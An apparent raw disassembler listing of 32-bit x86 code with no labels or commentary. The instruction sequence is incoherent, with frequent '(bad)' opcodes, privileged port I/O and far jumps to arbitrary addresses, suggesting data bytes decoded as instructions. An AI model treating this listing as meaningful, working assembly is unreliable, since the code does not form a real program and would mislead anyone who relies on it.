  423df9:	jle    0x423dde
  423dfb:	rcr    DWORD PTR [ebp-0x4e0294b1],0x37
  423e02:	fcomp  QWORD PTR [ecx]
  423e04:	outs   dx,DWORD PTR ds:[esi]
  423e05:	and    bl,BYTE PTR [ecx-0x15]
  423e08:	ins    DWORD PTR es:[edi],dx
  423e09:	lds    eax,FWORD PTR [ebp+edx*4+0x53]
  423e0d:	pop    ebp
  423e0e:	shl    esp,1
  423e10:	add    BYTE PTR [eax+0x3be9b5de],dh
  423e16:	jl     0x423e35
  423e18:	jg     0x423de4
  423e1a:	inc    ebp
  423e1b:	push   ds
  423e1c:	and    esi,DWORD PTR [ebp-0x29]
  423e1f:	mov    ch,0x4c
  423e21:	and    dl,BYTE PTR [ecx-0x9879872]
  423e27:	sub    eax,0xc130f3a4
  423e2c:	jb     0x423e6f
  423e2e:	xchg   edi,eax
  423e2f:	pop    esi
  423e30:	sahf   
  423e31:	jecxz  0x423e4f
  423e33:	fsubr  DWORD PTR [ebx+0x74]
  423e36:	ror    BYTE PTR [esi-0x4db76916],1
  423e3c:	out    0x45,al
  423e3e:	test   eax,0x792f298f
  423e43:	aam    0x2a
  423e45:	pop    ecx
  423e46:	sbb    ebp,edi
  423e48:	mov    WORD PTR [edx+0x4a],ss
  423e4b:	retf   
  423e4c:	out    dx,al
  423e4d:	mov    esp,0xcdb5cc60
  423e52:	out    0x30,al
  423e54:	mov    esp,0x544f563a
  423e59:	xor    BYTE PTR [ebx],ch
  423e5b:	(bad)
  423e5e:	outs   dx,BYTE PTR ds:[esi]
  423e5f:	xchg   ecx,eax
  423e60:	int3   
  423e61:	pop    ebp
  423e62:	add    bl,al
  423e64:	test   eax,0x56b552f0
  423e69:	cmp    BYTE PTR [ecx-0x4],bl
  423e6c:	mov    ds:0x61e3441,eax
  423e71:	sub    DWORD PTR [ecx],0xffffffbe
  423e74:	cmp    al,0xd8
  423e76:	sub    esp,DWORD PTR [esi-0x58]
  423e79:	push   cs
  423e7a:	inc    ebx
  423e7b:	aad    0x67
  423e7d:	sbb    dl,BYTE PTR [ebx-0x14]
  423e80:	inc    esp
  423e81:	xchg   ebp,eax
  423e82:	mov    ch,0x20
	...
  423e90:	add    BYTE PTR [ecx],dh
  423e92:	retf   
  423e93:	xor    BYTE PTR [ebx-0x6],0x7b
  423e97:	icebp  
  423e98:	retf   
  423e99:	aam    0xe9
  423e9b:	imul   esp,ebp,0xffffffbd
  423e9e:	test   BYTE PTR [edi],bl
  423ea0:	in     eax,0x73
  423ea2:	mov    dh,0x1
  423ea4:	add    BYTE PTR [ebx+0x3c000003],ch
  423eaa:	sbb    cl,BYTE PTR [edi-0x2]
  423ead:	mov    al,ds:0x76e70a46
  423eb2:	mov    eax,0x6fd77f1a
  423eb7:	test   BYTE PTR [ecx],bh
  423eb9:	sub    dh,BYTE PTR [edi+eiz*2-0x7f03bcd8]
  423ec0:	jns    0x423f06
  423ec2:	mov    ebx,0xc620aa59
  423ec7:	jmp    0x423ea8
  423ec9:	cmp    BYTE PTR [edx-0x3c],0x9f
  423ecd:	sub    al,0x9
  423ecf:	and    esi,DWORD PTR [edi+0x5c96cd55]
  423ed5:	inc    edx
  423ed6:	cld    
  423ed7:	icebp  
  423ed8:	mov    cl,0xf7
  423eda:	jb     0x423ef3
  423edc:	gs stc 
  423ede:	shl    BYTE PTR [esi],0x1b
  423ee1:	lds    edi,FWORD PTR [ebp+0x74]
  423ee4:	in     al,dx
  423ee5:	sub    esi,DWORD PTR [ebx+0x74]
  423ee8:	and    cl,al
  423eea:	jns    0x423ea7
  423eec:	je     0x423f3a
  423eee:	in     eax,0x92
  423ef0:	mov    bh,0x51
  423ef2:	call   0x6635dcfb
  423ef7:	outs   dx,BYTE PTR ds:[esi]
  423ef8:	ins    BYTE PTR es:[edi],dx
  423ef9:	je     0x423e89
  423efb:	jg     0x423ee3
  423efd:	sub    DWORD PTR [edi+0x3e],ebp
  423f00:	adc    DWORD PTR [edx-0x7514ed76],esp
  423f06:	and    DWORD PTR [esi-0x51],eax
  423f09:	xor    BYTE PTR [ecx-0x272db8e],ch
  423f0f:	aad    0xf8
  423f11:	repz mov eax,0x24b7a8d5
  423f17:	(bad)  
  423f18:	call   DWORD PTR [esi]
  423f1a:	or     ch,BYTE PTR [esi]
  423f1c:	test   al,0x7e
  423f1e:	mov    eax,ds:0x99c092b2
  423f23:	int    0xfb
  423f25:	call   0xba856557
  423f2a:	das    
  423f2b:	xor    eax,0x385f3248
  423f30:	xchg   edx,eax
  423f31:	push   es
  423f32:	(bad)  
  423f33:	outs   dx,BYTE PTR ds:[esi]
  423f34:	ror    DWORD PTR [esi*4-0x69cfd345],1
  423f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f3c:	popf   
  423f3d:	adc    eax,esi
  423f3f:	fld    DWORD PTR [ecx+0x2d1fe599]
  423f45:	mov    ds:0x52404eea,al
  423f4a:	lods   al,BYTE PTR ds:[esi]
  423f4b:	pop    es
  423f4c:	add    DWORD PTR [edx+0x51],esi
  423f4f:	bnd jg 0x423f00
  423f52:	sub    esp,ebp
  423f54:	cs mov ah,0xa6
  423f57:	pop    ebx
  423f58:	lahf   
  423f59:	add    DWORD PTR [ecx-0x21],esp
  423f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f5e:	rol    DWORD PTR [edx],cl
  423f60:	fild   WORD PTR [eax-0x70]
  423f63:	aad    0xfc
  423f65:	cdq    
  423f66:	repz mov bh,0x32
  423f69:	jge    0x423f3b
  423f6b:	add    eax,0x9bd5d5c0
  423f70:	ss xchg esp,eax
  423f73:	sbb    dh,BYTE PTR [ecx]
  423f75:	mov    ch,al
  423f77:	cmp    BYTE PTR [esi+0x17],bl
  423f7a:	fcomp  DWORD PTR [esi-0x74423e69]
  423f80:	pop    es
  423f81:	test   edi,ecx
  423f83:	dec    ebx
  423f84:	retf   0x5e5f
  423f87:	sbb    eax,0x79dc368
  423f8c:	and    al,0x54
  423f8e:	cmp    DWORD PTR [ebx+0x382b057e],edx
  423f94:	push   edx
  423f95:	and    al,0x4d
  423f97:	gs call 0xf967:0xb27e837e
  423f9f:	push   esi
  423fa0:	sbb    ebx,DWORD PTR [eax+0x13]
  423fa3:	pop    esp
  423fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fa5:	and    DWORD PTR [ebp+0x57135daf],edi
  423fab:	or     edx,esp
  423fad:	cmp    eax,0x4a964054
  423fb2:	mov    ch,BYTE PTR [ebx-0x6c2a10f3]
  423fb8:	lods   eax,DWORD PTR ds:[esi]
  423fb9:	test   eax,0x9b57bdfe
  423fbe:	adc    al,0xdc
  423fc0:	cli    
  423fc1:	mov    ecx,0xadc71fb3
  423fc6:	mul    BYTE PTR [eax+edx*1+0x230de8ba]
  423fcd:	sub    cl,BYTE PTR [esp+ebp*8+0x6]
  423fd1:	lods   al,BYTE PTR ds:[esi]
  423fd2:	sbb    edx,DWORD PTR [ebx-0x62]
  423fd5:	sbb    eax,0xab1f768c
  423fda:	icebp  
  423fdb:	leave  
  423fdc:	hlt    
  423fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fde:	and    DWORD PTR [ebx-0x46],ebp
  423fe1:	sbb    ecx,DWORD PTR [ebp+0x38790903]
  423fe7:	dec    eax
  423fe8:	arpl   WORD PTR [ebx],dx
  423fea:	pusha  
  423feb:	shl    esi,cl
  423fed:	enter  0xafb,0xd9
  423ff1:	icebp  
  423ff2:	icebp  
  423ff3:	inc    ebp
  423ff4:	mov    al,0xb2
  423ff6:	pop    ds
  423ff7:	or     al,0x4c
  423ff9:	test   al,0xc7
  423ffb:	jmp    0x38db496c
  424000:	push   0xffffff9f
  424002:	mov    ds:0xc69e72f5,al
  424007:	mov    ebp,0x1e6c6dd7
  42400c:	leave  
  42400d:	in     eax,0x75
  42400f:	das    
  424010:	push   0x18
  424012:	mov    eax,esp
  424014:	and    cl,ch
  424016:	rcr    BYTE PTR [eax+ebx*4],1
  424019:	dec    esp
  42401a:	push   ebx
  42401b:	and    cl,BYTE PTR [esi+ebx*8+0x75209890]
  424022:	cmp    eax,0x6e3f62ce
  424027:	xchg   esp,eax
  424028:	pop    ecx
  424029:	xchg   ebp,eax
  42402a:	sbb    al,0xfe
  42402c:	jb     0x424045
  42402e:	inc    ebp
  42402f:	push   esp
  424030:	xor    eax,0xaa74eee
  424035:	arpl   WORD PTR [ebx],bx
  424037:	cs push esi
  424039:	mov    al,BYTE PTR [esi]
  42403b:	pop    ss
  42403c:	bound  ebp,QWORD PTR [ecx-0x6d]
  42403f:	adc    eax,0xb94ec45b
  424044:	sub    bl,cl
  424046:	das    
  424047:	(bad)  
  424048:	sub    cl,bh
  42404a:	mov    bh,0x9b
  42404c:	and    BYTE PTR ds:0x4a9c27f2,0x7e
  424053:	mov    ah,0x76
  424055:	jnp    0x4240d6
  424057:	bound  edx,QWORD PTR [edx+0x77]
  42405a:	loopne 0x424006
  42405c:	in     al,dx
  42405d:	and    ah,ch
  42405f:	cs call 0xc24b134d
  424065:	ins    DWORD PTR es:[edi],dx
  424066:	xor    BYTE PTR [esi-0x3a58d87f],dh
  42406c:	rcl    DWORD PTR [esi],cl
  42406e:	xchg   edx,eax
  42406f:	test   eax,0xe1d71d37
  424074:	xor    eax,0xc50036b1
  424079:	fstp   DWORD PTR [ecx]
  42407b:	push   0xffffffdd
  42407d:	jmp    0x4240cc
  42407f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424080:	sbb    eax,DWORD PTR ss:[ebx]
  424083:	(bad)
  424088:	in     eax,0x9e
  42408a:	out    0x5d,eax
  42408c:	ret    0xa487
  42408f:	dec    esi
  424090:	cmp    eax,0xf0e708d5
  424095:	test   DWORD PTR [ebx+0x3f],esi
  424098:	jmp    0x42401b
  42409a:	push   ebp
  42409b:	xchg   edi,esi
  42409d:	fmul   DWORD PTR [edx+0x67e62b38]
  4240a3:	and    BYTE PTR [ebp-0x48fcde89],bl
  4240a9:	fisubr DWORD PTR [edi+ebp*4-0xd]
  4240ad:	or     al,0x20
  4240af:	call   0x2bd8:0x37189a5f
  4240b6:	mov    al,ds:0x7d3ae150
  4240bb:	into   
  4240bc:	mov    edi,0x19c234de
  4240c1:	mov    bh,BYTE PTR [edx+0x2d7b6d1e]
  4240c7:	mov    esi,ebx
  4240c9:	dec    ebx
  4240ca:	xor    cl,ch
  4240cc:	es jmp 0x88b7:0x5a2b4f92
  4240d4:	lahf   
  4240d5:	jb     0x424144
  4240d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240d8:	pop    ecx
  4240d9:	adc    ah,BYTE PTR ss:[edi+0x7e]
  4240dd:	retf   
  4240de:	add    al,BYTE PTR [edx+edi*8+0x3c369330]
  4240e5:	sub    esi,DWORD PTR [eax-0x6c]
  4240e8:	(bad)  
  4240e9:	xchg   edi,eax
  4240ea:	fadd   DWORD PTR [ebx]
  4240ec:	sbb    al,0x65
  4240ee:	dec    edi
  4240ef:	fnstsw WORD PTR [edi]
  4240f1:	shl    DWORD PTR [esi+0x2f],0x57
  4240f5:	jmp    0x4240a2
  4240f7:	icebp  
  4240f8:	shr    al,0xe9
  4240fb:	jg     0x4240fd
  4240fd:	push   ebx
  4240fe:	nop
  4240ff:	xchg   edi,eax
  424100:	outs   dx,DWORD PTR ds:[esi]
  424101:	pop    ss
  424102:	pop    es
  424103:	lds    ebp,FWORD PTR [eax+ecx*4+0x3d]
  424107:	push   0x3713b492
  42410c:	jg     0x42413c
  42410e:	add    dl,BYTE PTR [ebx]
  424110:	popa   
  424111:	pop    edx
  424112:	dec    ebx
  424113:	cwde   
  424114:	mov    esp,0x8963abdd
  424119:	in     eax,0x63
  42411b:	mov    ds:0xa71eeb01,eax
  424120:	in     eax,0x12
  424122:	adc    edx,DWORD PTR [edx-0x7b51aed]
  424128:	addr16 mov ds:0x1aa6,eax
  42412c:	lock mov ebp,0x3638568a
  424132:	cmp    ebp,DWORD PTR [edi+0x7d]
  424135:	lea    ebp,[esi-0x1f]
  424138:	inc    ebx
  424139:	pusha  
  42413a:	xchg   esi,eax
  42413b:	jmp    0x8ee688db
  424140:	dec    esp
  424141:	push   edi
  424142:	gs push ss
  424144:	jnp    0x424173
  424146:	ins    BYTE PTR es:[edi],dx
  424147:	in     al,0x90
  424149:	sub    bh,BYTE PTR [esi+0x3e]
  42414c:	mov    edi,0xc4b40188
  424151:	sbb    DWORD PTR [esi+0x63522171],eax
  424157:	jl     0x424156
  424159:	je     0x42410e
  42415b:	(bad)  
  42415c:	mov    esp,DWORD PTR [edi-0x6e]
  42415f:	xchg   ecx,eax
  424160:	push   eax
  424161:	fdivrp st(6),st
  424163:	and    BYTE PTR [esi+0x3d],bh
  424166:	sbb    al,BYTE PTR [ebp+0x28e82a04]
  42416c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42416d:	bound  esi,QWORD PTR [ebp+0x3bef0faa]
  424173:	jae    0x42415c
  424175:	out    0xa1,al
  424177:	pop    ebp
  424178:	ins    DWORD PTR es:[edi],dx
  424179:	popf   
  42417a:	fsub   QWORD PTR [eax]
  42417c:	or     BYTE PTR [eax+0x28],ch
  42417f:	addr16 enter 0xfd2c,0x18
  424184:	push   gs
  424186:	mov    cl,0xba
  424188:	fcomp  QWORD PTR [edx-0x34]
  42418b:	add    edi,DWORD PTR [ecx-0x2ca9e35a]
  424191:	call   0x3512:0x214ff426
  424198:	add    eax,0xc4c91fd1
  42419d:	pop    ebp
  42419e:	dec    esi
  42419f:	mov    al,0x44
  4241a1:	jns    0x424156
  4241a3:	xchg   edi,eax
  4241a4:	loopne 0x424214
  4241a6:	mov    ebx,0x5b9f2ec7
  4241ab:	out    dx,al
  4241ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241ad:	outs   dx,DWORD PTR ds:[esi]
  4241ae:	xor    eax,0xe184ec01
  4241b3:	jmp    FWORD PTR [ebp+0x4476e17d]
  4241b9:	xchg   edx,eax
  4241ba:	push   ds
  4241bb:	mov    eax,DWORD PTR [ebx-0x3b]
  4241be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241bf:	sub    al,0xb6
  4241c1:	pop    DWORD PTR [esi-0x41]
  4241c4:	mov    ecx,0xa9afa7b9
  4241c9:	out    0xac,eax
  4241cb:	add    BYTE PTR [eax],dl
  4241cd:	push   0x2
  4241cf:	aaa    
  4241d0:	mov    al,ds:0x7a6c329c
  4241d5:	and    al,0x15
  4241d7:	ror    dl,cl
  4241d9:	int    0xc9
  4241db:	loopne 0x424207
  4241dd:	outs   dx,BYTE PTR ds:[esi]
  4241de:	cmp    DWORD PTR [ebx],ebx
  4241e0:	sub    ah,al
  4241e2:	sub    DWORD PTR [eax+0x18],edi
  4241e5:	sub    eax,0xc8953c1
  4241ea:	jge    0x4241e4
  4241ec:	out    dx,eax
  4241ed:	(bad)  
  4241ee:	pusha  
  4241ef:	fistp  QWORD PTR [edi-0x19]
  4241f2:	inc    ebp
  4241f3:	in     eax,dx
  4241f4:	sub    eax,0xbeaabdce
  4241f9:	cwde   
  4241fa:	jae    0x4241e2
  4241fc:	xor    al,0xe4
  4241fe:	enter  0x99b1,0xdd
  424202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424203:	jbe    0x424265
  424205:	adc    edx,edi
  424207:	out    dx,al
  424208:	das    
  424209:	repnz push 0xfffffffc
  42420c:	cs aas 
  42420e:	push   edi
  42420f:	shr    BYTE PTR [ebx-0x1d],cl
  424212:	nop
  424213:	jo     0x424245
  424215:	jns    0x4241b8
  424217:	mov    edi,0xf890e249
  42421c:	js     0x42429a
  42421e:	dec    ebp
  42421f:	leave  
  424220:	(bad)  
  424222:	and    DWORD PTR [ebx+ebx*1],0xfffffff3
  424226:	out    dx,al
  424227:	icebp  
  424228:	scas   al,BYTE PTR es:[edi]
  424229:	dec    ebp
  42422a:	in     al,0xdb
  42422c:	hlt    
  42422d:	push   ebp
  42422e:	cli    
  42422f:	sbb    dh,BYTE PTR [edx+0x7de7700f]
  424235:	out    dx,eax
  424236:	aam    0xb8
  424238:	push   esi
  424239:	nop
  42423a:	leave  
  42423b:	xchg   ecx,eax
  42423c:	out    dx,al
  42423d:	mov    bl,0x1c
  42423f:	xchg   edx,eax
  424240:	cmp    esi,DWORD PTR [esi-0x1284511]
  424246:	xchg   DWORD PTR [esi],ebp
  424248:	leave  
  424249:	ins    BYTE PTR es:[edi],dx
  42424a:	adc    esp,DWORD PTR [esi+0x73]
  42424d:	addr16 aam 0x4e
  424250:	fstp   TBYTE PTR [ecx+0xa79a]
	...
  42425e:	add    BYTE PTR [eax],al
  424260:	add    bh,dh
  424262:	in     eax,0x9f
  424264:	jp     0x424205
  424266:	jp     0x42425f
  424268:	in     eax,dx
  424269:	sar    DWORD PTR [edi+0x5710212c],1
  42426f:	ins    BYTE PTR es:[edi],dx
  424270:	cmp    DWORD PTR [esi],ebx
  424272:	mov    edx,0x3ab0001
  424277:	add    BYTE PTR [eax],al
  424279:	shr    BYTE PTR [esi-0x5b],0x4e
  42427d:	lahf   
  42427e:	xor    ecx,eax
  424280:	jnp    0x424280
  424282:	in     al,0x36
  424284:	jg     0x42426f
  424286:	mov    edx,0xbc184a09
  42428b:	dec    edx
  42428c:	inc    ebx
  42428d:	inc    esp
  42428e:	data16 ja 0x424220
  424291:	(bad)  
  424292:	and    bh,BYTE PTR [esi+0x1dd0b7a1]
  424298:	outs   dx,BYTE PTR ds:[esi]
  424299:	frstor [edi]
  42429b:	(bad)  
  42429c:	fidivr WORD PTR [esi-0xed6a9ef]
  4242a2:	cmp    DWORD PTR [edx],esi
  4242a4:	ss push ebp
  4242a6:	xor    al,0x31
  4242a8:	repnz mov ds:0x3a16daf5,al
  4242ae:	mov    DWORD PTR [edi+0x34],ecx
  4242b1:	rol    DWORD PTR [edx],cl
  4242b3:	(bad)  
  4242b4:	(bad)  
  4242b5:	loopne 0x424299
  4242b7:	pusha  
  4242b8:	pop    ebx
  4242b9:	imul   ecx,esi,0x8b2f552
  4242bf:	jae    0x42429d
  4242c1:	or     esp,ecx
  4242c3:	ret    
  4242c4:	push   eax
  4242c5:	xor    ebp,ebp
  4242c7:	js     0x4242ce
  4242c9:	and    al,0x5e
  4242cb:	sbb    al,0x4
  4242ce:	mov    dl,0x0
  4242d0:	mov    eax,ds:0x76f40cd1
  4242d5:	ins    DWORD PTR es:[edi],dx
  4242d6:	cmp    edx,ecx
  4242d8:	dec    esi
  4242d9:	es ds retf 
  4242dc:	loopne 0x4242af
  4242de:	call   0x1a0:0x5f48b7f4
  4242e5:	clc    
  4242e6:	mov    al,ds:0xaab6feaf
  4242eb:	in     eax,dx
  4242ec:	dec    edx
  4242ed:	loop   0x424367
  4242ef:	push   ds
  4242f0:	jl     0x424278
  4242f2:	cs ret 0xf878
  4242f6:	clc    
  4242f7:	inc    edx
  4242f8:	popf   
  4242f9:	and    eax,0x56bcc398
  4242fe:	jbe    0x4242f9
  424300:	nop
  424301:	xchg   DWORD PTR [ebp+0x71],ebp
  424304:	xor    eax,0x99965ea3
  424309:	ins    DWORD PTR es:[edi],dx
  42430a:	pop    ebp
  42430b:	ins    DWORD PTR es:[edi],dx
  42430c:	pop    ds
  42430d:	push   cs
  42430e:	or     cl,al
  424310:	std    
  424311:	mov    DWORD PTR [esi],esi
  424313:	jp     0x42432c
  424315:	inc    edi
  424316:	xchg   ecx,eax
  424317:	fsubr  DWORD PTR [ebx]
  424319:	out    0xc6,eax
  42431b:	pop    DWORD PTR [eax*4-0x3122003]
  424322:	into   
  424323:	idiv   DWORD PTR [edi]
  424325:	mov    dh,0xa2
  424327:	pop    ecx
  424328:	or     edi,edi
  42432a:	mov    ebx,0xa0a09d69
  42432f:	and    BYTE PTR [ebx],dl
  424331:	adc    BYTE PTR [edi-0xf],dh
  424334:	pop    es
  424335:	mov    DWORD PTR [edx-0x1cfa9aec],ebp
  42433b:	add    edi,DWORD PTR [eax]
  42433d:	ret    
  42433e:	out    dx,al
  42433f:	stc    
  424340:	loopne 0x4242da
  424342:	jne    0x42435e
  424344:	in     al,0xf6
  424346:	bound  edi,QWORD PTR [ebp+0x4e1f403c]
  42434c:	retf   
  42434d:	imul   esi,DWORD PTR [esi+ebx*8-0x21],0x7b232d03
  424355:	(bad)  
  424356:	mov    BYTE PTR [ecx+0x5322c5dc],bh
  42435c:	xor    DWORD PTR [ebx],ecx
  42435e:	(bad)  
  424360:	loop   0x424383
  424362:	lds    edi,FWORD PTR [edi]
  424364:	adc    ebp,ebx
  424366:	cmp    bh,ch
  424368:	pop    esp
  424369:	sti    
  42436a:	gs fcomi st,st(5)
  42436d:	hlt    
  42436e:	outs   dx,DWORD PTR ds:[esi]
  42436f:	mov    BYTE PTR [eax+eiz*8-0x569ad5ff],cl
  424376:	ss add al,0x46
  424379:	mov    ds:0x25fbb57,eax
  42437e:	mov    edx,DWORD PTR [ebp-0x4d]
  424381:	jl     0x424355
  424383:	fcmovnbe st,st(5)
  424385:	or     ah,bl
  424387:	aaa    
  424388:	pop    ds
  424389:	xchg   ebp,eax
  42438a:	mov    ebx,0xa89f4c3
  42438f:	adc    esi,edx
  424391:	sub    dl,BYTE PTR ds:0xc5c86fc4
  424397:	in     al,0xef
  424399:	test   eax,0xf6ec222b
  42439e:	gs and al,0x5a
  4243a1:	jge    0x424401
  4243a3:	jp     0x42436f
  4243a5:	aas    
  4243a6:	push   ebx
  4243a7:	(bad)  
  4243a8:	mov    dl,0x7
  4243aa:	shr    DWORD PTR [ebx+0x311b44d6],cl
  4243b0:	fcmovnu st,st(2)
  4243b2:	mov    edi,0x4eceb0ee
  4243b7:	cmp    al,0xad
  4243b9:	and    eax,0xa57b23c2
  4243be:	pop    ecx
  4243bf:	inc    esi
  4243c0:	int    0x2e
  4243c2:	imul   BYTE PTR ds:0x2ec369b0
  4243c8:	or     DWORD PTR [ebx-0x36],eax
  4243cb:	and    ebx,ebx
  4243cd:	pop    es
  4243ce:	push   ecx
  4243cf:	mov    ebp,0x58db04b3
  4243d4:	jmp    0x424408
  4243d6:	aaa    
  4243d7:	sub    DWORD PTR [ebp+0x51d48c1f],edx
  4243dd:	push   ecx
  4243de:	mov    BYTE PTR [edi+edx*1],bl
  4243e1:	pusha  
  4243e2:	jge    0x42440b
  4243e4:	test   eax,0x619eb195
  4243e9:	scas   al,BYTE PTR es:[edi]
  4243ea:	push   di
  4243ec:	inc    ebp
  4243ed:	gs jbe 0x424377
  4243f0:	pop    esi
  4243f1:	inc    edx
  4243f2:	pop    edi
  4243f3:	dec    eax
  4243f4:	inc    edx
  4243f5:	push   cs
  4243f6:	jecxz  0x424455
  4243f8:	stc    
  4243f9:	gs mov ebx,0xf76a86c4
  4243ff:	icebp  
  424400:	aaa    
  424401:	shl    BYTE PTR [edi-0x7b622ecd],1
  424407:	outs   dx,DWORD PTR ds:[esi]
  424408:	dec    edi
  424409:	xchg   BYTE PTR [ebp+edi*8+0x5e26b6a4],cl
  424410:	pop    ebp
  424411:	in     al,0x1f
  424413:	mov    ecx,0x177ba5cb
  424418:	cli    
  424419:	icebp  
  42441a:	scas   eax,DWORD PTR es:[edi]
  42441b:	enter  0xf158,0x77
  42441f:	pop    ebp
  424420:	or     ah,0x9c
  424423:	jne    0x42442a
  424425:	rol    BYTE PTR [ecx+eax*1],1
  424428:	mov    edx,0xafcd7922
  42442d:	movaps xmm5,XMMWORD PTR [ebx+0xf]
  424431:	out    dx,eax
  424432:	ret    
  424433:	ins    BYTE PTR es:[edi],dx
  424434:	int    0xef
  424436:	scas   eax,DWORD PTR es:[edi]
  424437:	push   ecx
  424438:	cmp    DWORD PTR [edi-0x5d],ebx
  42443b:	mov    ch,0xd0
  42443d:	mov    es,edi
  42443f:	iret   
  424440:	shl    BYTE PTR ds:0x5ed068b4,1
  424446:	mov    ah,0x98
  424448:	loop   0x424407
  42444a:	in     eax,dx
  42444b:	sbb    bh,BYTE PTR [eax]
  42444d:	gs pop ecx
  42444f:	ret    
  424450:	imul   esi,ecx,0x72608681
  424456:	fisttp QWORD PTR [edi+esi*8]
  424459:	jmp    0xf0d2ff90
  42445e:	aas    
  42445f:	jg     0x424421
  424461:	aaa    
  424462:	sub    eax,0x5d126509
  424467:	fwait
  424468:	add    DWORD PTR [eax+ebp*2+0x4],eax
  42446c:	fdiv   QWORD PTR [edx]
  42446e:	inc    ebx
  42446f:	shl    DWORD PTR [esi+0x304d0281],0xc3
  424476:	adc    DWORD PTR [edx-0x33],ecx
  424479:	mov    ch,0x3b
  42447b:	sti    
  42447c:	jnp    0x424439
  42447e:	or     eax,DWORD PTR [ecx+0x7c9e179b]
  424484:	iret   
  424485:	shl    DWORD PTR [edx],1
  424487:	pop    ds
  424488:	inc    eax
  424489:	jno    0x424493
  42448b:	outs   dx,DWORD PTR ds:[esi]
  42448c:	test   bh,bl
  42448e:	jmp    0xfb0919fa
  424493:	jno    0x424424
  424495:	dec    eax
  424496:	jmp    0x6f1ab8f4
  42449b:	jns    0x42445f
  42449d:	mov    dh,0x67
  42449f:	(bad)  [edx]
  4244a1:	mov    ds:0x8f44f271,eax
  4244a6:	sahf   
  4244a7:	dec    edi
  4244a8:	mov    al,ds:0xca9566a1
  4244ad:	int    0x3d
  4244af:	add    ebp,DWORD PTR [edx+0x705b178b]
  4244b5:	(bad)  
  4244b6:	push   ebp
  4244b7:	icebp  
  4244b8:	push   esi
  4244b9:	lahf   
  4244ba:	lahf   
  4244bb:	enter  0x1bd2,0xff
  4244bf:	mov    al,0xce
  4244c1:	aam    0xc1
  4244c3:	sbb    DWORD PTR [ecx],esp
  4244c5:	dec    eax
  4244c6:	mov    eax,ds:0x786b3f4d
  4244cb:	pop    ds
  4244cc:	jbe    0x4244cf
  4244ce:	aad    0x75
  4244d0:	xchg   ebp,eax
  4244d1:	push   ss
  4244d2:	pushf  
  4244d3:	lods   al,BYTE PTR ds:[esi]
  4244d4:	aas    
  4244d5:	inc    eax
  4244d6:	out    0xfb,eax
  4244d8:	pop    esp
  4244d9:	faddp  st(0),st
  4244db:	adc    BYTE PTR [ebp-0x3bb27bc],0x25
  4244e2:	or     edx,0x59ae7189
  4244e8:	(bad)  [ebx-0x6a]
  4244eb:	lahf   
  4244ec:	push   ebx
  4244ed:	nop
  4244ee:	cmc    
  4244ef:	std    
  4244f0:	cs ins BYTE PTR es:[edi],dx
  4244f2:	push   0x9aeaf92b
  4244f7:	cmc    
  4244f8:	push   eax
  4244f9:	(bad)  
  4244fa:	aad    0xe2
  4244fc:	push   esp
  4244fd:	test   al,0xa2
  4244ff:	xor    al,0x87
  424501:	push   ss
  424502:	aas    
  424503:	adc    al,0x80
  424505:	sti    
  424506:	mov    esp,0xf103a758
  42450b:	xchg   BYTE PTR [edx],dl
  42450d:	sbb    BYTE PTR [ebx+0x1af38c02],0x68
  424514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424515:	mov    edi,0xfc9454c1
  42451a:	mov    bh,BYTE PTR [eax+0x6f]
  42451d:	jb     0x424541
  42451f:	jecxz  0x424583
  424521:	mov    al,ds:0xb5080c49
  424526:	shl    BYTE PTR [esi-0x7d],1
  424529:	jne    0x4244d0
  42452b:	jno    0x4244ba
  42452d:	push   ebx
  42452e:	and    edx,DWORD PTR ds:0xf08dbe17
  424534:	fistp  DWORD PTR [ebx-0x5c351ee7]
  42453a:	pop    eax
  42453b:	shl    BYTE PTR [esi-0x62fd3004],0xd6
  424542:	icebp  
  424543:	push   edi
  424544:	pop    ebp
  424545:	inc    esp
  424546:	or     eax,0x13dafb30
  42454b:	mov    ds:0xc98cd35c,al
  424550:	mov    edi,0xe64b2973
  424555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424557:	lock (bad) 
  424559:	mov    ah,dh
  42455b:	sbb    eax,0xcddeaa84
  424560:	sahf   
  424561:	or     edx,ebx
  424563:	xchg   ebx,eax
  424564:	sbb    al,0x62
  424566:	lahf   
  424567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424568:	pop    esi
  424569:	fwait
  42456a:	adc    DWORD PTR [ebx-0x5],ebp
  42456d:	sbb    BYTE PTR [esi-0x6fcfa492],bl
  424573:	xchg   edx,eax
  424574:	mov    ds:0x79097c2f,al
  424579:	mov    edx,0x645f8437
  42457e:	mov    edx,0x3761450d
  424583:	adc    esp,DWORD PTR [edi]
  424585:	jle    0x424507
  424587:	mov    DWORD PTR [edx-0x3f],ecx
  42458a:	fdiv   QWORD PTR [edx+0x28]
  42458d:	sub    BYTE PTR [esi-0x23],al
  424590:	mov    DWORD PTR [esi-0x7a],0xcd63aaba
  424597:	retf   0x3bd7
  42459a:	jecxz  0x424552
  42459c:	les    edx,FWORD PTR [ebx]
  42459e:	and    BYTE PTR [edx],dh
  4245a0:	mov    dh,0x11
  4245a2:	xchg   edi,eax
  4245a3:	push   edx
  4245a4:	fst    QWORD PTR [eax+0x50e29fea]
  4245aa:	jno    0x424535
  4245ac:	or     BYTE PTR [ecx-0x73],ah
  4245af:	(bad)  
  4245b0:	cld    
  4245b1:	pop    esi
  4245b2:	sub    BYTE PTR [esi],bh
  4245b4:	or     ecx,DWORD PTR [edi+0x78f87962]
  4245ba:	cmp    ah,BYTE PTR [edi+ebp*8]
  4245bd:	call   0xed12:0x2d23739b
  4245c4:	xchg   edx,eax
  4245c5:	cmp    BYTE PTR [ebx],ch
  4245c7:	fadd   QWORD PTR [edx]
  4245c9:	ins    BYTE PTR es:[edi],dx
  4245ca:	adc    DWORD PTR [eax*1+0x46088f1d],eax
  4245d1:	pop    edi
  4245d2:	mov    DWORD PTR [esi-0x4e114c74],eax
